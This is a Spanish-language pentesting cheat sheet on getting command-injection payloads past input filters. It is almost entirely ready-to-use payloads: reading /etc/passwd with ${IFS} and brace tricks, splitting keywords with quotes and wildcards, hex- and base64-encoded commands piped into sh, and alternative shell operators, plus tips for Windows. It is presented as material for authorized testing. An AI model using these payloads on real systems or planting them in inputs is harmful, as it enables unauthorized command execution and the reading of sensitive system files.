# Command Injection — Evasión de filtros

Ver índice: [command-injection.md](command-injection.md). **Solo sobre objetivos autorizados.**

## Espacios filtrados

```bash
cat${IFS}/etc/passwd
{cat,/etc/passwd}
cat</etc/passwd
X=$'\x20';cat${X}/etc/passwd
```

## Palabras clave filtradas (partir el comando)

```bash
w'h'o'am'i
who$@ami
c\at /etc/passwd
who""ami
/bin/c?t /etc/passwd        # comodines
/???/??t /etc/passwd
```

## Comillas / caracteres bloqueados

```bash
# ejecutar sin usar el nombre literal
$(printf '\x69\x64')        # "id"
echo aWQ= | base64 -d | sh  # comando en base64
```

## Operadores alternativos

```bash
%0a  (newline)   %0d   ;   |   &   &&   ||   `cmd`   $(cmd)
```

## Notas

- Combina técnicas: `${IFS}` + comodines + base64.
- Adapta a Windows: `^` para escapar, variables `%...%`, `set` para trocear.
